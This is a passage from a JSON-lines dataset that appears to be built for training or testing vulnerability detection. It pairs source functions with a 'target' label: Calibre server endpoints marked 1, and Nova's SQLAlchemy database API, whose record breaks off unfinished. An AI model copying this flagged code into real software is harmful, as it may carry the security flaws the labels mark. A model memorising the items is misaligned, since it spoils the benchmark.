isinstance(new_data, dict):\n                raise Exception('session data must be a dict')\n        except Exception as err:\n            raise HTTPBadRequest('Invalid data: %s' % as_unicode(err))\n        ud = ctx.user_manager.get_session_data(rd.username)\n        ud.update(new_data)\n        ctx.user_manager.set_session_data(rd.username, ud)\n\n\n@endpoint('/interface-data/get-books', postprocess=json)\ndef get_books(ctx, rd):\n    '''\n    Get books for the specified query\n\n    Optional: ?library_id=<default library>&num=50&sort=timestamp.desc&search=''&vl=''\n    '''\n    library_id, db, sorts, orders, vl = get_basic_query_data(ctx, rd)\n    try:\n        num = int(rd.query.get('num', rd.opts.num_per_page))\n    except Exception:\n        raise HTTPNotFound('Invalid number of books: %r' % rd.query.get('num'))\n    searchq = rd.query.get('search', '')\n    db = get_library_data(ctx, rd)[0]\n    ans = {}\n    mdata = ans['metadata'] = {}\n    with db.safe_read_lock:\n        try:\n            ans['search_result'] = search_result(\n                ctx, rd, db, searchq, num, 0, ','.join(sorts), ','.join(orders), vl\n            )\n        except ParseException as err:\n            # This must not be translated as it is used by the front end to\n            # detect invalid search expressions\n            raise HTTPBadRequest('Invalid search expression: %s' % as_unicode(err))\n        for book_id in ans['search_result']['book_ids']:\n            data = book_as_json(db, book_id)\n            if data is not None:\n                mdata[book_id] = data\n    return ans\n\n\n@endpoint('/interface-data/book-metadata/{book_id=0}', postprocess=json)\ndef book_metadata(ctx, rd, book_id):\n    '''\n    Get metadata for the specified book. If no book_id is specified, return metadata for a random book.\n\n    Optional: ?library_id=<default library>&vl=<virtual library>\n    '''\n    library_id, db, sorts, orders, vl = get_basic_query_data(ctx, rd)\n\n    if not book_id:\n        all_ids = ctx.allowed_book_ids(rd, db)\n        book_id = random.choice(tuple(all_ids))\n    elif not ctx.has_id(rd, db, book_id):\n        raise BookNotFound(book_id, db)\n    data = book_as_json(db, book_id)\n    if data is None:\n        raise BookNotFound(book_id, db)\n    data['id'] = book_id  # needed for random book view (when book_id=0)\n    return data\n\n\n@endpoint('/interface-data/tag-browser')\ndef tag_browser(ctx, rd):\n    '''\n    Get the Tag Browser serialized as JSON\n    Optional: ?library_id=<default library>&sort_tags_by=name&partition_method=first letter\n              &collapse_at=25&dont_collapse=&hide_empty_categories=&vl=''\n    '''\n    db, library_id = get_library_data(ctx, rd)[:2]\n    opts = categories_settings(rd.query, db)\n    vl = rd.query.get('vl') or ''\n    etag = cPickle.dumps([db.last_modified().isoformat(), rd.username, library_id, vl, list(opts)], -1)\n    etag = hashlib.sha1(etag).hexdigest()\n\n    def generate():\n        return json(ctx, rd, tag_browser, categories_as_json(ctx, rd, db, opts, vl))\n\n    return rd.etagged_dynamic_response(etag, generate)\n\n\n@endpoint('/interface-data/field-names/{field}', postprocess=json)\ndef field_names(ctx, rd, field):\n    '''\n    Get a list of all names for the specified field\n    Optional: ?library_id=<default library>\n    '''\n    db, library_id = get_library_data(ctx, rd)[:2]\n    return tuple(db.all_field_names(field))\n", "target": 1}
{"idx": 1018, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright (c) 2011 X.commerce, a business unit of eBay Inc.\n# Copyright 2010 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"Implementation of SQLAlchemy backend.\"\"\"\n\nimport datetime\nimport functools\nimport re\nimport warnings\n\nfrom nova import block_device\nfrom nova import db\nfrom nova import exception\nfrom nova import flags\nfrom nova import utils\nfrom nova import log as logging\nfrom nova.compute import aggregate_states\nfrom nova.compute import vm_states\nfrom nova.db.sqlalchemy import models\nfrom nova.db.sqlalchemy.session import get_session\nfrom sqlalchemy import and_\nfrom sqlalchemy import or_\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.orm import joinedload_all\nfrom sqlalchemy.sql import func\nfrom sqlalchemy.sql.expression import asc\nfrom sqlalchemy.sql.expression import desc\nfrom sqlalchemy.sql.expression import literal_column\n\nFLAGS = flags.FLAGS\nflags.DECLARE('reserved_host_disk_mb', 'nova.scheduler.host_manager')\nflags.DECLARE('reserved_host_memory_mb', 'nova.scheduler.host_manager')\n\nLOG = logging.getLogger(__name__)\n\n\ndef is_admin_context(context):\n    \"\"\"Indicates if the request context is an administrator.\"\"\"\n    if not context:\n        warnings.warn(_('Use of empty request context is deprecated'),\n                      DeprecationWarning)\n        raise Exception('die')\n    return context.is_admin\n\n\ndef is_user_context(context):\n    \"\"\"Indicates if the request context is a normal user.\"\"\"\n    if not context:\n        return False\n    if context.is_admin:\n        return False\n    if not context.user_id or not context.project_id:\n        return False\n    return True\n\n\ndef authorize_project_context(context, project_id):\n    \"\"\"Ensures a request has permission to access the given project.\"\"\"\n    if is_user_context(context):\n        if not context.project_id:\n            raise exception.NotAuthorized()\n        elif context.project_id != project_id:\n            raise exception.NotAuthorized()\n\n\ndef authorize_user_context(context, user_id):\n    \"\"\"Ensures a request has permission to access the given user.\"\"\"\n    if is_user_context(context):\n        if not context.user_id:\n            raise exception.NotAuthorized()\n        elif context.user_id != user_id:\n            raise exception.NotAuthorized()\n\n\ndef authorize_quota_class_context(context, class_name):\n    \"\"\"Ensures a request has permission to access the given quota class.\"\"\"\n    if is_user_context(context):\n        if not context.quota_class:\n            raise exception.NotAuthorized()\n        elif context.quota_class != class_name:\n            raise exception.NotAuthorized()\n\n\ndef require_admin_context(f):\n    \"\"\"Decorator to require admin request context.\n\n    The first argument to the wrapped function must be the context.\n\n    \"\"\"\n\n    def wrapper(*args, **kwargs):\n        if not is_admin_context(args[0]):\n            raise exception.AdminRequired()\n        return f(*args, **kwargs)\n    return wrapper\n\n\ndef require_context(f):\n    \"\"\"Decorator to require *any* user or admin context.\n\n    This does no authorization for user or project access matching, see\n    :py:func:`authorize_project_context` and\n    :py:func:`authorize_user_context`.\n\n    The first argument to the wrapped function must be the context.\n\n    \"\"\"\n\n    def wrapper(*args, **kwargs):\n        if not is_admin_context(args[0]) and not is_user_context(args[0]):\n            raise exception.NotAuthorized()\n        return f(*args, **kwargs)\n    return wrapper\n\n\ndef require_instance_exists(f):\n    \"\"\"Decorator to require the specified instance to exist.\n\n    Requires the wrapped function to use context and instance_id as\n    their first two arguments.\n    \"\"\"\n\n    def wrapper(context, instance_id, *args, **kwargs):\n        db.instance_get(context, instance_id)\n        return f(context, instance_id, *args, **kwargs)\n    wrapper.__name__ = f.__name__\n    return wrapper\n\n\ndef require_volume_exists(f):\n    \"\"\"Decorator to require the specified volume to exist.\n\n    Requires the wrapped function to use context and volume_id as\n    their first two arguments.\n    \"\"\"\n\n    def wrapper(context, volume_id, *args, **kwargs):\n        db.volume_get(context, volume_id)\n        return f(context, volume_id, *args, **kwargs)\n    wrapper.__name__ = f.__name__\n    return wrapper\n\n\ndef require_aggregate_exists(f):\n    \"\"\"Decorator to require the specified aggregate to exist.\n\n    Requires the wrapped function to use context and aggregate_id as\n    their first two arguments.\n    \"\"\"\n\n    @functools.wraps(f)\n    def wrapper(context, aggregate_id, *args, **kwargs):\n        db.aggregate_get(context, aggregate_id)\n        return f(context, aggregate_id, *args, **kwargs)\n    return wrapper\n\n\ndef model_query(context, *args, **kwargs):\n    \"\"\"Query helper that accounts for context's `read_deleted` field.\n\n    :param context: context to query under\n    :param session: if present, the session to use\n    :param read_deleted: if present, overrides context's read_deleted field.\n    :param project_only: if present and context is user-type, then restrict\n            query to match the context's project_id.\n    \"\"\"\n    session = kwargs.get('session') or get_session()\n    read_deleted = kwargs.get('read_deleted') or context.read_deleted\n    project_only = kwargs.get('project_only')\n\n    query = session.query(*args)\n\n    if read_deleted == 'no':\n        query = query.filter_by(deleted=False)\n    elif read_deleted == 'yes':\n        pass  # omit the filter to include deleted and active\n    elif read_deleted == 'only':\n        query = query.filter_by(deleted=True)\n    else:\n        raise Exception(\n                _(\"Unrecognized read_deleted value '%s'\") % read_deleted)\n\n    if project_only and is_user_context(context):\n        query = query.filter_by(project_id=context.project_id)\n\n    return query\n\n\ndef exact_filter(query, model, filters, legal_keys):\n    \"\"\"Applies exact match filtering to a query.\n\n    Returns the updated query.  Modifies filters argument to remove\n    filters consumed.\n\n    :param query: query to apply filters to\n    :param model: model object the query applies to, for IN-style\n                  filtering\n    :param filters: dictionary of filters; values that are lists,\n                    tuples, sets, or frozensets cause an 'IN' test to\n                    be performed, while exact matching ('==' operator)\n                    is used for other values\n    :param legal_keys: list of keys to apply exact filtering to\n    \"\"\"\n\n    filter_dict = {}\n\n    # Walk through all the keys\n    for key in legal_keys:\n        # Skip ones we're not filtering on\n        if key not in filters:\n            continue\n\n        # OK, filtering on this key; what value do we search for?\n        value = filters.pop(key)\n\n        if isinstance(value, (list, tuple, set, frozenset)):\n            # Looking for values in a list; apply to query directly\n            column_attr = getattr(model, key)\n            query = query.filter(column_attr.in_(value))\n        else:\n            # OK, simple exact match; save for later\n            filter_dict[key] = value\n\n    # Apply simple exact matches\n    if filter_dict:\n        query = query.filter_by(**filter_dict)\n\n    return query\n\n\n###################\n\n\n@require_admin_context\ndef service_destroy(context, service_id):\n    session = get_session()\n    with session.begin():\n        service_ref = service_get(context, service_id, session=session)\n        service_ref.delete(session=session)\n\n        if service_ref.topic == 'compute' and service_ref.compute_node:\n            for c in service_ref.compute_node:\n                c.delete(session=session)\n\n\n@require_admin_context\ndef service_get(context, service_id, session=None):\n    result = model_query(context, models.Service, session=session).\\\n                     options(joinedload('compute_node')).\\\n                     filter_by(id=service_id).\\\n                     first()\n    if not result:\n        raise exception.ServiceNotFound(service_id=service_id)\n\n    return result\n\n\n@require_admin_context\ndef service_get_all(context, disabled=None):\n    query = model_query(context, models.Service)\n\n    if disabled is not None:\n        query = query.filter_by(disabled=disabled)\n\n    return query.all()\n\n\n@require_admin_context\ndef service_get_all_by_topic(context, topic):\n    return model_query(context, models.Service, read_deleted=\"no\").\\\n                filter_by(disabled=False).\\\n                filter_by(topic=topic).\\\n                all()\n\n\n@require_admin_context\ndef service_get_by_host_and_topic(context, host, topic):\n    return model_query(context, models.Service, read_deleted=\"no\").\\\n                filter_by(disabled=False).\\\n                filter_by(host=host).\\\n                filter_by(topic=topic).\\\n                first()\n\n\n@require_admin_context\ndef service_get_all_by_host(context, host):\n    return model_query(context, models.Service, read_deleted=\"no\").\\\n                filter_by(host=host).\\\n                all()\n\n\n@require_admin_context\ndef service_get_all_compute_by_host(context, host):\n    result = model_query(context, models.Service, read_deleted=\"no\").\\\n                options(joinedload('compute_node')).\\\n                filter_by(host=host).\\\n                filter_by(topic=\"compute\").\\\n                all()\n\n    if not result:\n        raise exception.ComputeHostNotFound(host=host)\n\n    return result\n\n\n@require_admin_context\ndef _service_get_all_topic_subquery(context, session, topic, subq, label):\n    sort_value = getattr(subq.c, label)\n    return model_query(context, models.Service,\n                       func.coalesce(sort_value, 0),\n                       session=session, read_deleted=\"no\").\\\n                filter_by(topic=topic).\\\n                filter_by(disabled=False).\\\n                outerjoin((subq, models.Service.host == subq.c.host)).\\\n                order_by(sort_value).\\\n                all()\n\n\n@require_admin_context\ndef service_get_all_compute_sorted(context):\n    session = get_session()\n    with session.begin():\n        # NOTE(vish): The intended query is below\n        #             SELECT services.*, COALESCE(inst_cores.instance_cores,\n        #                                         0)\n        #             FROM services LEFT OUTER JOIN\n        #             (SELECT host, SUM(instances.vcpus) AS instance_cores\n        #              FROM instances GROUP BY host) AS inst_cores\n        #             ON services.host = inst_cores.host\n        topic = 'compute'\n        label = 'instance_cores'\n        subq = model_query(context, models.Instance.host,\n                           func.sum(models.Instance.vcpus).label(label),\n                           session=session, read_deleted=\"no\").\\\n                       group_by(models.Instance.host).\\\n                       subquery()\n        return _service_get_all_topic_subquery(context,\n                                               session,\n                                               topic,\n                                               subq,\n                                               label)\n\n\n@require_admin_context\ndef service_get_all_volume_sorted(context):\n    session = get_session()\n    with session.begin():\n        topic = 'volume'\n        label = 'volume_gigabytes'\n        subq = model_query(context, models.Volume.host,\n                           func.sum(models.Volume.size).label(label),\n                           session=session, read_deleted=\"no\").\\\n                       group_by(models.Volume.host).\\\n                       subquery()\n        return _service_get_all_topic_subquery(context,\n                                               session,\n                                               topic,\n                                               subq,\n                                               label)\n\n\n@require_admin_context\ndef service_get_by_args(context, host, binary):\n    result = model_query(context, models.Service).\\\n                     filter_by(host=host).\\\n                     filter_by(binary=binary).\\\n                     first()\n\n    if not result:\n        raise exception.HostBinaryNotFound(host=host, binary=binary)\n\n    return result\n\n\n@require_admin_context\ndef service_create(context, values):\n    service_ref = models.Service()\n    service_ref.update(values)\n    if not FLAGS.enable_new_services:\n        service_ref.disabled = True\n    service_ref.save()\n    return service_ref\n\n\n@require_admin_context\ndef service_update(context, service_id, values):\n    session = get_session()\n    with session.begin():\n        service_ref = service_get(context, service_id, session=session)\n        service_ref.update(values)\n        service_ref.save(session=session)\n\n\n###################\n\n\n@require_admin_context\ndef compute_node_get(context, compute_id, session=None):\n    result = model_query(context, models.ComputeNode, session=session).\\\n                     filter_by(id=compute_id).\\\n                     first()\n\n    if not result:\n        raise exception.ComputeHostNotFound(host=compute_id)\n\n    return result\n\n\n@require_admin_context\ndef compute_node_get_all(context, session=None):\n    return model_query(context, models.ComputeNode, session=session).\\\n                    options(joinedload('service')).\\\n                    all()\n\n\ndef _get_host_utilization(context, host, ram_mb, disk_gb):\n    \"\"\"Compute the current utilization of a given host.\"\"\"\n    instances = instance_get_all_by_host(context, host)\n    vms = len(instances)\n    free_ram_mb = ram_mb - FLAGS.reserved_host_memory_mb\n    free_disk_gb = disk_gb - (FLAGS.reserved_host_disk_mb * 1024)\n\n    work = 0\n    for instance in instances:\n        free_ram_mb -= instance.memory_mb\n        free_disk_gb -= instance.root_gb\n        free_disk_gb -= instance.ephemeral_gb\n        if instance.vm_state in [vm_states.BUILDING, vm_states.REBUILDING,\n                                 vm_states.MIGRATING, vm_states.RESIZING]:\n            work += 1\n    return dict(free_ram_mb=free_ram_mb,\n                free_disk_gb=free_disk_gb,\n                current_workload=work,\n                running_vms=vms)\n\n\ndef _adjust_compute_node_values_for_utilization(context, values, session):\n    service_ref = service_get(context, values['service_id'], session=session)\n    host = service_ref['host']\n    ram_mb = values['memory_mb']\n    disk_gb = values['local_gb']\n    values.update(_get_host_utilization(context, host, ram_mb, disk_gb))\n\n\n@require_admin_context\ndef compute_node_create(context, values, session=None):\n    \"\"\"Creates a new ComputeNode and populates the capacity fields\n    with the most recent data.\"\"\"\n    if not session:\n        session = get_session()\n\n    _adjust_compute_node_values_for_utilization(context, values, session)\n    with session.begin(subtransactions=True):\n        compute_node_ref = models.ComputeNode()\n        session.add(compute_node_ref)\n        compute_node_ref.update(values)\n    return compute_node_ref\n\n\n@require_admin_context\ndef compute_node_update(context, compute_id, values, auto_adjust):\n    \"\"\"Creates a new ComputeNode and populates the capacity fields\n    with the most recent data.\"\"\"\n    session = get_session()\n    if auto_adjust:\n        _adjust_compute_node_values_for_utilization(context, values, session)\n    with session.begin(subtransactions=True):\n        compute_ref = compute_node_get(context, compute_id, session=session)\n        compute_ref.update(values)\n        compute_ref.save(session=session)\n\n\ndef compute_node_get_by_host(context, host):\n    \"\"\"Get all capacity entries for the given host.\"\"\"\n    session = get_session()\n    with session.begin():\n        node = session.query(models.ComputeNode).\\\n                             options(joinedload('service')).\\\n                             filter(models.Service.host == host).\\\n                             filter_by(deleted=False)\n        return node.first()\n\n\ndef compute_node_utilization_update(context, host, free_ram_mb_delta=0,\n                          free_disk_gb_delta=0, work_delta=0, vm_delta=0):\n    \"\"\"Update a specific ComputeNode entry by a series of deltas.\n    Do this as a single atomic action and lock the row for the\n    duration of the operation. Requires that ComputeNode record exist.\"\"\"\n    session = get_session()\n    compute_node = None\n    with session.begin(subtransactions=True):\n        compute_node = session.query(models.ComputeNode).\\\n                              options(joinedload('service')).\\\n                              filter(models.Service.host == host).\\\n                              filter_by(deleted=False).\\\n                              with_lockmode('update').\\\n                              first()\n        if compute_node is None:\n            raise exception.NotFound(_(\"No ComputeNode for %(host)s\") %\n                                     locals())\n\n        # This table thingy is how we get atomic UPDATE x = x + 1\n        # semantics.\n        table = models.ComputeNode.__table__\n        if free_ram_mb_delta != 0:\n            compute_node.free_ram_mb = table.c.free_ram_mb + free_ram_mb_delta\n        if free_disk_gb_delta != 0:\n            compute_node.free_disk_gb = (table.c.free_disk_gb +\n                                         free_disk_gb_delta)\n        if work_delta != 0:\n            compute_node.current_workload = (table.c.current_workload +\n                                             work_delta)\n        if vm_delta != 0:\n            compute_node.running_vms = table.c.running_vms + vm_delta\n    return compute_node\n\n\ndef compute_node_utilization_set(context, host, free_ram_mb=None,\n                                 free_disk_gb=None, work=None, vms=None):\n    \"\"\"Like compute_node_utilization_update() modify a specific host\n    entry. But this function will set the metrics absolutely\n    (vs. a delta update).\n    \"\"\"\n    session = get_session()\n    compute_node = None\n    with session.begin(subtransactions=True):\n        compute_node = session.query(models.ComputeNode).\\\n                              options(joinedload('service')).\\\n                              filter(models.Service.host == host).\\\n                              filter_by(deleted=False).\\\n                              with_lockmode('update').\\\n                              first()\n        if compute_node is None:\n            raise exception.NotFound(_(\"No ComputeNode for %(host)s\") %\n                                     locals())\n\n        if free_ram_mb != None:\n            compute_node.free_ram_mb = free_ram_mb\n        if free_disk_gb != None:\n            compute_node.free_disk_gb = free_disk_gb\n        if work != None:\n            compute_node.current_workload = work\n        if vms != None:\n            compute_node.running_vms = vms\n\n    return compute_node\n\n\n###################\n\n\n@require_admin_context\ndef certificate_get(context, certificate_id, session=None):\n    result = model_query(context, models.Certificate, session=session).\\\n                     filter_by(id=certificate_id).\\\n                     first()\n\n    if not result:\n        raise exception.CertificateNotFound(certificate_id=certificate_id)\n\n    return result\n\n\n@require_admin_context\ndef certificate_create(context, values):\n    certificate_ref = models.Certificate()\n    for (key, value) in values.iteritems():\n        certificate_ref[key] = value\n    certificate_ref.save()\n    return certificate_ref\n\n\n@require_admin_context\ndef certificate_get_all_by_project(context, project_id):\n    return model_query(context, models.Certificate, read_deleted=\"no\").\\\n                   filter_by(project_id=project_id).\\\n                   all()\n\n\n@require_admin_context\ndef certificate_get_all_by_user(context, user_id):\n    return model_query(context, models.Certificate, read_deleted=\"no\").\\\n                   filter_by(user_id=user_id).\\\n                   all()\n\n\n@require_admin_context\ndef certificate_get_all_by_user_and_project(context, user_id, project_id):\n    return model_query(context, models.Certificate, read_deleted=\"no\").\\\n                   filter_by(user_id=user_id).\\\n                   filter_by(project_id=project_id).\\\n                   all()\n\n\n###################\n\n\n@require_context\ndef floating_ip_get(context, id):\n    result = model_query(context, models.FloatingIp, project_only=True).\\\n                 filter_by(id=id).\\\n                 first()\n\n    if not result:\n        raise exception.FloatingIpNotFound(id=id)\n\n    return result\n\n\n@require_context\ndef floating_ip_get_pools(context):\n    session = get_session()\n    pools = []\n    for result in session.query(models.FloatingIp.pool).distinct():\n        pools.append({'name': result[0]})\n    return pools\n\n\n@require_context\ndef floating_ip_allocate_address(context, project_id, pool):\n    authorize_project_context(context, project_id)\n    session = get_session()\n    with session.begin():\n        floating_ip_ref = model_query(context, models.FloatingIp,\n                                      session=session, read_deleted=\"no\").\\\n                                  filter_by(fixed_ip_id=None).\\\n                                  filter_by(project_id=None).\\\n                                  filter_by(pool=pool).\\\n                                  with_lockmode('update').\\\n                                  first()\n        # NOTE(vish): if with_lockmode isn't supported, as in sqlite,\n        #             then this has concurrency issues\n        if not floating_ip_ref:\n            raise exception.NoMoreFloatingIps()\n        floating_ip_ref['project_id'] = project_id\n        session.add(floating_ip_ref)\n    return floating_ip_ref['address']\n\n\n@require_context\ndef floating_ip_create(context, values):\n    floating_ip_ref = models.FloatingIp()\n    floating_ip_ref.update(values)\n    floating_ip_ref.save()\n    return floating_ip_ref['address']\n\n\n@require_context\ndef floating_ip_count_by_project(context, project_id):\n    authorize_project_context(context, project_id)\n    # TODO(tr3buchet): why leave auto_assigned floating IPs out?\n    return model_query(context, models.FloatingIp, read_deleted=\"no\").\\\n                   filter_by(project_id=project_id).\\\n                   filter_by(auto_assigned=False).\\\n                   count()\n\n\n@require_context\ndef floating_ip_fixed_ip_associate(context, floating_address,\n                                   fixed_address, host):\n    session = get_session()\n    with session.begin():\n        floating_ip_ref = floating_ip_get_by_address(context,\n                                                     floating_address,\n                                                     session=session)\n        fixed_ip_ref = fixed_ip_get_by_address(context,\n                                               fixed_address,\n                                               session=session)\n        floating_ip_ref.fixed_ip_id = fixed_ip_ref[\"id\"]\n        floating_ip_ref.host = host\n        floating_ip_ref.save(session=session)\n\n\n@require_context\ndef floating_ip_deallocate(context, address):\n    session = get_session()\n    with session.begin():\n        floating_ip_ref = floating_ip_get_by_address(context,\n                                                     address,\n                                                     session=session)\n        floating_ip_ref['project_id'] = None\n        floating_ip_ref['host'] = None\n        floating_ip_ref['auto_assigned'] = False\n        floating_ip_ref.save(session=session)\n\n\n@require_context\ndef floating_ip_destroy(context, address):\n    session = get_session()\n    with session.begin():\n        floating_ip_ref = floating_ip_get_by_address(context,\n                                                     address,\n                                                     session=session)\n        floating_ip_ref.delete(session=session)\n\n\n@require_context\ndef floating_ip_disassociate(context, address):\n    session = get_session()\n    with session.begin():\n        floating_ip_ref = floating_ip_get_by_address(context,\n                                                     address,\n                                                     session=session)\n        fixed_ip_ref = fixed_ip_get(context,\n                                    floating_ip_ref['fixed_ip_id'])\n        if fixed_ip_ref:\n            fixed_ip_address = fixed_ip_ref['address']\n        else:\n            fixed_ip_address = None\n        floating_ip_ref.fixed_ip_id = None\n        floating_ip_ref.host = None\n        floating_ip_ref.save(session=session)\n    return fixed_ip_address\n\n\n@require_context\ndef floating_ip_set_auto_assigned(context, address):\n    session = get_session()\n    with session.begin():\n        floating_ip_ref = floating_ip_get_by_address(context,\n                                                     address,\n                                                     session=session)\n        floating_ip_ref.auto_assigned = True\n        floating_ip_ref.save(session=session)\n\n\ndef _floating_ip_get_all(context):\n    return model_query(context, models.FloatingIp, read_deleted=\"no\")\n\n\n@require_admin_context\ndef floating_ip_get_all(context):\n    floating_ip_refs = _floating_ip_get_all(context).all()\n    if not floating_ip_refs:\n        raise exception.NoFloatingIpsDefined()\n    return floating_ip_refs\n\n\n@require_admin_context\ndef floating_ip_get_all_by_host(context, host):\n    floating_ip_refs = _floating_ip_get_all(context).\\\n                            filter_by(host=host).\\\n                            all()\n    if not floating_ip_refs:\n        raise exception.FloatingIpNotFoundForHost(host=host)\n    return floating_ip_refs\n\n\n@require_context\ndef floating_ip_get_all_by_project(context, project_id):\n    authorize_project_context(context, project_id)\n    # TODO(tr3buchet): why do we not want auto_assigned floating IPs here?\n    return _floating_ip_get_all(context).\\\n                         filter_by(project_id=project_id).\\\n                         filter_by(auto_assigned=False).\\\n                         all()\n\n\n@require_context\ndef floating_ip_get_by_address(context, address, session=None):\n    result = model_query(context, models.FloatingIp, session=session).\\\n                filter_by(address=address).\\\n                first()\n\n    if not result:\n        raise exception.FloatingIpNotFoundForAddress(address=address)\n\n    # If the floating IP has a project ID set, check to make sure\n    # the non-admin user has access.\n    if result.project_id and is_user_context(context):\n        authorize_project_context(context, result.project_id)\n\n    return result\n\n\n@require_context\ndef floating_ip_get_by_fixed_address(context, fixed_address, session=None):\n    if not session:\n        session = get_session()\n\n    fixed_ip = fixed_ip_get_by_address(context, fixed_address, session)\n    fixed_ip_id = fixed_ip['id']\n\n    return model_query(context, models.FloatingIp, session=session).\\\n                   filter_by(fixed_ip_id=fixed_ip_id).\\\n                   all()\n\n    # NOTE(tr3buchet) please don't invent an exception here, empty list is fine\n\n\n@require_context\ndef floating_ip_get_by_fixed_ip_id(context, fixed_ip_id, session=None):\n    if not session:\n        session = get_session()\n\n    return model_query(context, models.FloatingIp, session=session).\\\n                   filter_by(fixed_ip_id=fixed_ip_id).\\\n                   all()\n\n\n@require_context\ndef floating_ip_update(context, address, values):\n    session = get_session()\n    with session.begin():\n        floating_ip_ref = floating_ip_get_by_address(context, address, session)\n        for (key, value) in values.iteritems():\n            floating_ip_ref[key] = value\n        floating_ip_ref.save(session=session)\n\n\n@require_context\ndef _dnsdomain_get(context, session, fqdomain):\n    return model_query(context, models.DNSDomain,\n                       session=session, read_deleted=\"no\").\\\n               filter_by(domain=fqdomain).\\\n               with_lockmode('update').\\\n               first()\n\n\n@require_context\ndef dnsdomain_get(context, fqdomain):\n    session = get_session()\n    with session.begin():\n        return _dnsdomain_get(context, session, fqdomain)\n\n\n@require_admin_context\ndef _dnsdomain_get_or_create(context, session, fqdomain):\n    domain_ref = _dnsdomain_get(context, session, fqdomain)\n    if not domain_ref:\n        dns_ref = models.DNSDomain()\n        dns_ref.update({'domain': fqdomain,\n                        'availability_zone': None,\n                        'project_id': None})\n        return dns_ref\n\n    return domain_ref\n\n\n@require_admin_context\ndef dnsdomain_register_for_zone(context, fqdomain, zone):\n    session = get_session()\n    with session.begin():\n        domain_ref = _dnsdomain_get_or_create(context, session, fqdomain)\n        domain_ref.scope = 'private'\n        domain_ref.availability_zone = zone\n        domain_ref.save(session=session)\n\n\n@require_admin_context\ndef dnsdomain_register_for_project(context, fqdomain, project):\n    session = get_session()\n    with session.begin():\n        domain_ref = _dnsdomain_get_or_create(context, session, fqdomain)\n        domain_ref.scope = 'public'\n        domain_ref.project_id = project\n        domain_ref.save(session=session)\n\n\n@require_admin_context\ndef dnsdomain_unregister(context, fqdomain):\n    session = get_session()\n    with session.begin():\n        session.query(models.DNSDomain).\\\n                     filter_by(domain=fqdomain).\\\n                     delete()\n\n\n@require_context\ndef dnsdomain_list(context):\n    session = get_session()\n    records = model_query(context, models.DNSDomain,\n                  session=session, read_deleted=\"no\").\\\n                  with_lockmode('update').all()\n    domains = []\n    for record in records:\n        domains.append(record.domain)\n\n    return domains\n\n\n###################\n\n\n@require_admin_context\ndef fixed_ip_associate(context, address, instance_id, network_id=None,\n                       reserved=False):\n    \"\"\"Keyword arguments:\n    reserved -- should be a boolean value(True or False), exact value will be\n    used to filter on the fixed ip address\n    \"\"\"\n    session = get_session()\n    with session.begin():\n        network_or_none = or_(models.FixedIp.network_id == network_id,\n                              models.FixedIp.network_id == None)\n        fixed_ip_ref = model_query(context, models.FixedIp, session=session,\n                                   read_deleted=\"no\").\\\n                               filter(network_or_none).\\\n                               filter_by(reserved=reserved).\\\n                               filter_by(address=address).\\\n                               with_lockmode('update').\\\n                               first()\n        # NOTE(vish): if with_lockmode isn't supported, as in sqlite,\n        #             then this has concurrency issues\n        if fixed_ip_ref is None:\n            raise exception.FixedIpNotFoundForNetwork(address=address,\n                                            network_id=network_id)\n        if fixed_ip_ref.instance_id:\n            raise exception.FixedIpAlreadyInUse(address=address)\n\n        if not fixed_ip_ref.network_id:\n            fixed_ip_ref.network_id = network_id\n        fixed_ip_ref.instance_id = instance_id\n        session.add(fixed_ip_ref)\n    return fixed_ip_ref['address']\n\n\n@require_admin_context\ndef fixed_ip_associate_pool(context, network_id, instance_id=None, host=None):\n    session = get_session()\n    with session.begin():\n        network_or_none = or_(models.FixedIp.network_id == network_id,\n                              models.FixedIp.network_id == None)\n        fixed_ip_ref = model_query(context, models.FixedIp, session=session,\n                                   read_deleted=\"no\").\\\n                               filter(network_or_none).\\\n                               filter_by(reserved=False).\\\n                               filter_by(instance_id=None).\\\n                               filter_by(host=None).\\\n                               with_lockmode('update').\\\n                               first()\n        # NOTE(vish): if with_lockmode isn't supported, as in sqlite,\n        #             then this has concurrency issues\n        if not fixed_ip_ref:\n            raise exception.NoMoreFixedIps()\n\n        if fixed_ip_ref['network_id'] is None:\n            fixed_ip_ref['network'] = network_id\n\n        if instance_id:\n            fixed_ip_ref['instance_id'] = instance_id\n\n        if host:\n            fixed_ip_ref['host'] = host\n        session.add(fixed_ip_ref)\n    return fixed_ip_ref['address']\n\n\n@require_context\ndef fixed_ip_create(context, values):\n    fixed_ip_ref = models.FixedIp()\n    fixed_ip_ref.update(values)\n    fixed_ip_ref.save()\n    return fixed_ip_ref['address']\n\n\n@require_context\ndef fixed_ip_bulk_create(context, ips):\n    session = get_session()\n    with session.begin():\n        for ip in ips:\n            model = models.FixedIp()\n            model.update(ip)\n            session.add(model)\n\n\n@require_context\ndef fixed_ip_disassociate(context, address):\n    session = get_session()\n    with session.begin():\n        fixed_ip_ref = fixed_ip_get_by_address(context,\n                                               address,\n                                               session=session)\n        fixed_ip_ref['instance_id'] = None\n        fixed_ip_ref.save(session=session)\n\n\n@require_admin_context\ndef fixed_ip_disassociate_all_by_timeout(context, host, time):\n    session = get_session()\n    # NOTE(vish): only update fixed ips that \"belong\" to this\n    #             host; i.e. the network host or the instance\n    #             host matches. Two queries necessary because\n    #             join with update doesn't work.\n    host_filter = or_(and_(models.Instance.host == host,\n                           models.Network.multi_host == True),\n                      models.Network.host == host)\n    result = session.query(models.FixedIp.id).\\\n                     filter(models.FixedIp.deleted == False).\\\n                     filter(models.FixedIp.allocated == False).\\\n                     filter(models.FixedIp.updated_at < time).\\\n                     join((models.Network,\n                           models.Network.id == models.FixedIp.network_id)).\\\n                     join((models.Instance,\n                           models.Instance.id == models.FixedIp.instance_id)).\\\n                     filter(host_filter).\\\n                     all()\n    fixed_ip_ids = [fip[0] for fip in result]\n    if not fixed_ip_ids:\n        return 0\n    result = model_query(context, models.FixedIp, session=session).\\\n                     filter(models.FixedIp.id.in_(fixed_ip_ids)).\\\n                     update({'instance_id': None,\n                             